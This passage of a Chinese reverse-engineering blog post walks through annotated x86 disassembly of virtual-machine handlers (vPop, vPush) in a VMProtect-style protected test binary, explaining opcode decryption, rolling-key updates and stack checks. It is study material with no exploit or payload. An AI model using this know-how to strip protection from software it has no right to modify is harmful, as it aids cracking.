        inc al</span><br><span class=\"line\">0044532B    34 28           xor al,0x28</span><br><span class=\"line\">00445332    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00445334    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x8</span><br><span class=\"line\">0044533F    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00445346    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0044534C    33CB            xor ecx,ebx</span><br><span class=\"line\">0044534E    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">00445351    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00478CFC    49              dec ecx</span><br><span class=\"line\">00478CFD    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">0046EDD9    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">0046EDE5    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0046EDEA    03E9            add ebp,ecx\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0043713E    55              push ebp                                 </span><br><span class=\"line\">0043713F    C3              retn\t\t\t\t\t\t\t\t\t;0x00474E9C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r4\"><a href=\"#vPop-r4\" class=\"headerlink\" title=\"vPop r4\"></a>vPop r4</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00474E9C    8B0E            mov ecx,dword ptr ds:[esi]              ;读取原始esp</span><br><span class=\"line\">00474EA0    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">00474EAB    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00474EAE    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">00474EB6    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">00445C08    04 95           add al,0x95</span><br><span class=\"line\">00445C0B    F6D8            neg al</span><br><span class=\"line\">00483885    FEC0            inc al</span><br><span class=\"line\">00483887    34 28           xor al,0x28</span><br><span class=\"line\">0048388A    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00483890    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x10</span><br><span class=\"line\">00483895    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004376C4    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004745C8    33CB            xor ecx,ebx</span><br><span class=\"line\">0044E82C    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0044E82F    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">004072B1    49              dec ecx</span><br><span class=\"line\">004072B5    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">004072BB    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">004072C5    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004072C9    03E9            add ebp,ecx</span><br><span class=\"line\">00471DC6    55              push ebp                             </span><br><span class=\"line\">00471DC7    C3              retn\t\t\t\t\t\t\t\t\t;0x00476E65</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r0\"><a href=\"#vPop-r0\" class=\"headerlink\" title=\"vPop r0\"></a>vPop r0</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00476E65    8B0E            mov ecx,dword ptr ds:[esi]              ;读取原始esp</span><br><span class=\"line\">00476E67    8DB6 04000000   lea esi,dword ptr ds:[esi+0x4]\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">00476E75    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0047D681    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">0047D687    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0047D689    04 95           add al,0x95</span><br><span class=\"line\">0047D694    F6D8            neg al</span><br><span class=\"line\">0047C676    FEC0            inc al</span><br><span class=\"line\">0047C67B    34 28           xor al,0x28</span><br><span class=\"line\">0047C67F    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0047C681    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x0</span><br><span class=\"line\">0047C68C    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0047C68E    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0046C29E    33CB            xor ecx,ebx</span><br><span class=\"line\">0046C2A1    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0046C2A8    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">0044B630    49              dec ecx</span><br><span class=\"line\">0044B631    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">0044B637    81C1 1A29644A   add ecx,0x4A64291A</span><br><span class=\"line\">0044B648    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0044B64D    03E9            add ebp,ecx</span><br><span class=\"line\">00422D63   /FFE5            jmp ebp                                 ;0x00451F05</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r15\"><a href=\"#vPop-r15\" class=\"headerlink\" title=\"vPop r15\"></a>vPop r15</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00451F05    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp</span><br><span class=\"line\">00451F0A    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">00451F15    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00451F18    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">00451F1E    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">00451F20    04 95           add al,0x95</span><br><span class=\"line\">00451F25    F6D8            neg al</span><br><span class=\"line\">004718C3    FEC0            inc al</span><br><span class=\"line\">004718C5    34 28           xor al,0x28</span><br><span class=\"line\">004718CA    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004718CC    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;eax=0x3C</span><br><span class=\"line\">004718CF    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004718D1    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004718D7    33CB            xor ecx,ebx                             </span><br><span class=\"line\">004718D9    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">004718DC    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">004407D7    49              dec ecx</span><br><span class=\"line\">004407D8    81F1 F25E4677   xor ecx,0x77465EF2</span><br><span class=\"line\">004407E3    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">004407EE    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004407F0    03E9            add ebp,ecx</span><br><span class=\"line\">004407F2    FFE5            jmp ebp                                 ;0x0045325C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-ebp-0x19ff74\"><a href=\"#vPush-ebp-0x19ff74\" class=\"headerlink\" title=\"vPush ebp(0x19ff74)\"></a>vPush ebp(0x19ff74)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045325C    0FB60F          movzx ecx,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00453267    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0045326D    32CB            xor cl,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0045326F    F6D9            neg cl</span><br><span class=\"line\">00453272    80F1 0E         xor cl,0xE</span><br><span class=\"line\">00453278    80E9 21         sub cl,0x21</span><br><span class=\"line\">00453282    F6D9            neg cl</span><br><span class=\"line\">0045328E    80F1 E2         xor cl,0xE2</span><br><span class=\"line\">00453296    32D9            xor bl,cl\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004532A5    8B140C          mov edx,dword ptr ss:[esp+ecx]\t\t\t;从v_esp中读取数据到edx</span><br><span class=\"line\">004532A8    81EE 04000000   sub esi,0x4\t\t\t\t\t\t\t\t;原始esp-0x4</span><br><span class=\"line\">004532B4    8916            mov dword ptr ds:[esi],edx\t\t\t\t;edx=0x0019FF74,把读到的数据存到esp中,此处两句指令对应 push edx</span><br><span class=\"line\">004532BD    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004532C4    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0041B011    33CB            xor ecx,ebx                             ;解密读取到的字节</span><br><span class=\"line\">0041B018    81E9 8C1F9123   sub ecx,0x23911F8C</span><br><span class=\"line\">0041B01E    D1C9            ror ecx,1</span><br><span class=\"line\">004692ED    49              dec ecx</span><br><span class=\"line\">004692F3    F7D1            not ecx</span><br><span class=\"line\">004692FA    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">004692FC    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]\t\t\t;edx=v_esp+0x60</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;原始esp与edx比较</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C\t\t\t\t\t;如果原始esp&gt;edx就正常返回,防止原始esp内容覆盖了vm_context</span><br><span class=\"line\">00481408    8BC4            mov eax,esp\t\t\t\t\t\t\t\t;将v_esp传给eax</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]\t\t\t;把原始esp上台0x80大小,然后把地址传给edx</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4\t\t\t\t\t\t\t</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx\t\t\t\t\t\t\t\t;把新的堆栈地址传给v_esp</span><br><span class=\"line\">0046734B    57              push edi                               </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax\t\t\t\t\t\t\t\t</span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi] ;把原来v_esp的内容拷贝到新的v_esp</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                  </span><br><span class=\"line\">00458194    5F              pop edi                                  </span><br><span class=\"line\">0044BD0C    55              push ebp                                 </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t;0x004786D0\t</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-esp-0x0019FF2C\"><a href=\"#vPush-esp-0x0019FF2C\" class=\"headerlink\" title=\"vPush esp(0x0019FF2C)\"></a>vPush esp(0x0019FF2C)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004786D0    8BC6            mov eax,esi\t\t\t\t\t\t\t\t;原始esp传给eax,当前esp保存的是变量a的地址</span><br><span class=\"line\">004786D8    81EE 04000000   sub esi,0x4\t\t\t\t\t\t\t\t;原始esp-0x4</span><br><span class=\"line\">004786DE    8906            mov dword ptr ds:[esi],eax\t\t\t\t;把eax存到原始esp中,此处两句指令对应 push eax</span><br><span class=\"line\">004786E6    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004786E8    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004786EE    33CB            xor ecx,ebx                             ;解密读取到的字节                </span><br><span class=\"line\">0040AA81    49              dec ecx</span><br><span class=\"line\">0040AA82    D1C9            ror ecx,1</span><br><span class=\"line\">0040AA8C    F7D9            neg ecx</span><br><span class=\"line\">0040AA95    81C1 0C094E44   add ecx,0x444E090C</span><br><span class=\"line\">0040AA9C    0FC9            bswap ecx</span><br><span class=\"line\">0040AA9F    C1C9 02         ror ecx,0x2                                               </span><br><span class=\"line\">0040AAAA    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0040AAAC    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]\t\t\t;edx=v_esp+0x60</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;原始esp与edx比较</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C\t\t\t\t\t;如果原始esp&gt;edx就正常返回,防止原始esp内容覆盖了vm_context</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]\t\t\t;把原始esp上台0x80大小,然后把地址传给edx</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx\t\t\t\t\t\t\t\t;把新的堆栈地址传给v_esp</span><br><span class=\"line\">0046734B    57              push edi                                                    </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                         </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]    ;把原来v_esp的内容拷贝到新的v_esp                                       </span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                                    </span><br><span class=\"line\">00458194    5F              pop edi                                                       </span><br><span class=\"line\">0044BD0C    55              push ebp                                                     </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t;0x004343B9</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-ebp-0x19FF2C\"><a href=\"#vPop-ebp-0x19FF2C\" class=\"headerlink\" title=\"vPop ebp(0x19FF2C)\"></a>vPop ebp(0x19FF2C)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004343B9    8B0E            mov ecx,dword ptr ds:[esi]\t\t\t\t;读取原始esp,ecx=保存了变量a的地址</span><br><span class=\"line\">004343BE    81C6 04000000   add esi,0x4\t\t\t\t\t\t\t\t;原始esp+0x4, 此处两句指令对应 pop ecx</span><br><span class=\"line\">004343C4    0FB607          movzx eax,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">004343C7    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节</span><br><span class=\"line\">004343CD    32C3            xor al,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">004343CF    04 95           add al,0x95</span><br><span class=\"line\">004343D1    F6D8            neg al</span><br><span class=\"line\">0040ACDA    FEC0            inc al</span><br><span class=\"line\">0040ACDE    34 28           xor al,0x28</span><br><span class=\"line\">0040ACEB    32D8            xor bl,al\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0040ACEF    890C04          mov dword ptr ss:[esp+eax],ecx\t\t\t;ecx=0x0019FF2C</span><br><span class=\"line\">0040ACF5    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0040ACF8    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0040AD03    33CB            xor ecx,ebx</span><br><span class=\"line\">0047679A    C1C9 02         ror ecx,0x2</span><br><span class=\"line\">0047679D    81F1 7E7F9C09   xor ecx,0x99C7F7E</span><br><span class=\"line\">00448CC5    49              dec ecx</span><br><span class=\"line\">00448CC6    81F1 F25E4677   xor ecx,0x77465EF2\t\t\t\t\t\t\t</span><br><span class=\"line\">00448CCD    8D89 1A29644A   lea ecx,dword ptr ds:[ecx+0x4A64291A]</span><br><span class=\"line\">00448CD3    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00448CDA    03E9            add ebp,ecx</span><br><span class=\"line\">00449A6E    55              push ebp                                                    </span><br><span class=\"line\">00449A6F    C3              retn\t\t\t\t\t\t\t\t\t;0x0045225C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-ecx-0x0\"><a href=\"#vPush-ecx-0x0\" class=\"headerlink\" title=\"vPush ecx(0x0)\"></a>vPush ecx(0x0)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045225C    0FB60F          movzx ecx,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节                                                 ; test1_vm.0043D0C3</span><br><span class=\"line\">00452265    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0045226B    32CB            xor cl,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0045226D    F6D9            neg cl</span><br><span class=\"line\">00452273    80F1 0E         xor cl,0xE</span><br><span class=\"line\">0045227D    80E9 21         sub cl,0x21</span><br><span class=\"line\">0045228B    F6D9            neg cl</span><br><span class=\"line\">0045228D    80F1 E2         xor cl,0xE2</span><br><span class=\"line\">00452292    32D9            xor bl,cl\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">00452297    8B140C          mov edx,dword ptr ss:[esp+ecx]\t\t\t;从vm_stack读取数据</span><br><span class=\"line\">0045229A    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">004522AE    8916            mov dword ptr ds:[esi],edx\t\t\t\t;push edx</span><br><span class=\"line\">004522B0    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004522B3    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004522BE    33CB            xor ecx,ebx</span><br><span class=\"line\">0045676E    81E9 8C1F9123   sub ecx,0x23911F8C</span><br><span class=\"line\">00456776    D1C9            ror ecx,1</span><br><span class=\"line\">00463F87    49              dec ecx</span><br><span class=\"line\">00463F8C    F7D1            not ecx</span><br><span class=\"line\">0041EFFB    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0041F001    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">00445778    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;检查堆栈</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                      ; test1_vm.0043D0C3</span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                                ; test1_vm.0043D0C3</span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                       ; 0019FF2C                                                  ; test1_vm.0043D0C3</span><br><span class=\"line\">00458194    5F              pop edi                                                       ; 0019FF2C</span><br><span class=\"line\">0044BD0C    55              push ebp                                                      ; test1_vm.0045225C</span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t;0047E64B</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-esp\"><a href=\"#vPush-esp\" class=\"headerlink\" title=\"vPush esp\"></a>vPush esp</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0047E64B    0FB60F          movzx ecx,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">0047E65A    81C7 01000000   add edi,0x1\t\t\t\t\t\t\t\t;跳过读取的字节 </span><br><span class=\"line\">0047E661    32CB            xor cl,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">0047E663    F6D9            neg cl</span><br><span class=\"line\">0047E66B    80F1 0E         xor cl,0xE</span><br><span class=\"line\">0047E670    80E9 21         sub cl,0x21</span><br><span class=\"line\">0047E673    80C2 96         add dl,0x96</span><br><span class=\"line\">0047E681    F6D9            neg cl</span><br><span class=\"line\">0047E683    80F1 E2         xor cl,0xE2</span><br><span class=\"line\">0047E686    32D9            xor bl,cl\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0047E68E    8B140C          mov edx,dword ptr ss:[esp+ecx]\t\t\t</span><br><span class=\"line\">0047E697    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">0047E6A2    8916            mov dword ptr ds:[esi],edx\t\t\t\t;push edx</span><br><span class=\"line\">0047E6AC    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0047E6B4    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">0047E6BF    33CB            xor ecx,ebx</span><br><span class=\"line\">0047E6C8    81E9 8C1F9123   sub ecx,0x23911F8C</span><br><span class=\"line\">0047E6CF    D1C9            ror ecx,1</span><br><span class=\"line\">0044CE2D    49              dec ecx</span><br><span class=\"line\">0044CE2E    F7D1            not ecx</span><br><span class=\"line\">0044CE30    33D9            xor ebx,ecx\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0044CE33    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;堆栈检查</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                     </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                                    </span><br><span class=\"line\">00458194    5F              pop edi                                                       </span><br><span class=\"line\">0044BD0C    55              push ebp                                                   </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t;0x00454C04</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-1\"><a href=\"#vPush-1\" class=\"headerlink\" title=\"vPush 1\"></a>vPush 1</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00454C04    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">004131C1    81C7 04000000   add edi,0x4\t\t\t\t\t\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004131C7    33CB            xor ecx,ebx                             ;解密读取到的字节            </span><br><span class=\"line\">004131C9    41              inc ecx                                               </span><br><span class=\"line\">004503B4    F7D9            neg ecx</span><br><span class=\"line\">00455A33    41              inc ecx</span><br><span class=\"line\">00455A34    81F1 66772375   xor ecx,0x75237766</span><br><span class=\"line\">00455A3B    33D9            xor ebx,ecx</span><br><span class=\"line\">00455A40    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">00447C2B    890E            mov dword ptr ds:[esi],ecx\t\t\t\t;push ecx</span><br><span class=\"line\">00447C35    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">00447C37    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">00447C41    33CB            xor ecx,ebx                             ;解密读取到的字节                 </span><br><span class=\"line\">00447C49    F7D9            neg ecx</span><br><span class=\"line\">0041448F    8D89 6233DE7C   lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">00414495    F7D9            neg ecx</span><br><span class=\"line\">00414497    F7D1            not ecx</span><br><span class=\"line\">00414499    33D9            xor ebx,ecx</span><br><span class=\"line\">0041449B    03E9            add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;堆栈检查</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C\t</span><br><span class=\"line\">00481408    8BC4            mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx</span><br><span class=\"line\">0046734B    57              push edi                                                   </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi]                                              </span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                                                                          </span><br><span class=\"line\">00458194    5F              pop edi                                                      </span><br><span class=\"line\">0044BD0C    55              push ebp                                                </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t\t;0041043E</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-ebp-0x0019FF2C\"><a href=\"#vPush-ebp-0x0019FF2C\" class=\"headerlink\" title=\"vPush ebp(0x0019FF2C)\"></a>vPush ebp(0x0019FF2C)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0041043E    0FB60F          movzx ecx,byte ptr ds:[edi]\t\t\t\t;读取opcode的第一个字节</span><br><span class=\"line\">00410443    8DBF 01000000   lea edi,dword ptr ds:[edi+0x1]\t\t\t;跳过读取的字节</span><br><span class=\"line\">0041044E    32CB            xor cl,bl\t\t\t\t\t\t\t\t;解密读取到的字节</span><br><span class=\"line\">00410450    F6D9            neg cl</span><br><span class=\"line\">00410452    80F1 0E         xor cl,0xE</span><br><span class=\"line\">00410460    80E9 21         sub cl,0x21</span><br><span class=\"line\">0041046B    F6D9            neg cl</span><br><span class=\"line\">0041046D    D2D2            rcl dl,cl</span><br><span class=\"line\">0041046F    F6DE            neg dh</span><br><span class=\"line\">00410471    80F1 E2         xor cl,0xE2</span><br><span class=\"line\">00410479    32D9            xor bl,cl\t\t\t\t\t\t\t\t;更新滚动key</span><br><span class=\"line\">0041047D    8B140C          mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">00410480    81EE 04000000   sub esi,0x4</span><br><span class=\"line\">00410489    8916            mov dword ptr ds:[esi],edx\t\t\t\t;push edx</span><br><span class=\"line\">00410497    8B0F            mov ecx,dword ptr ds:[edi]\t\t\t\t;从opcode读取4字节</span><br><span class=\"line\">0041049E    8DBF 04000000   lea edi,dword ptr ds:[edi+0x4]\t\t\t;递增opcode,跳到下一个opcode</span><br><span class=\"line\">004104A4    33CB            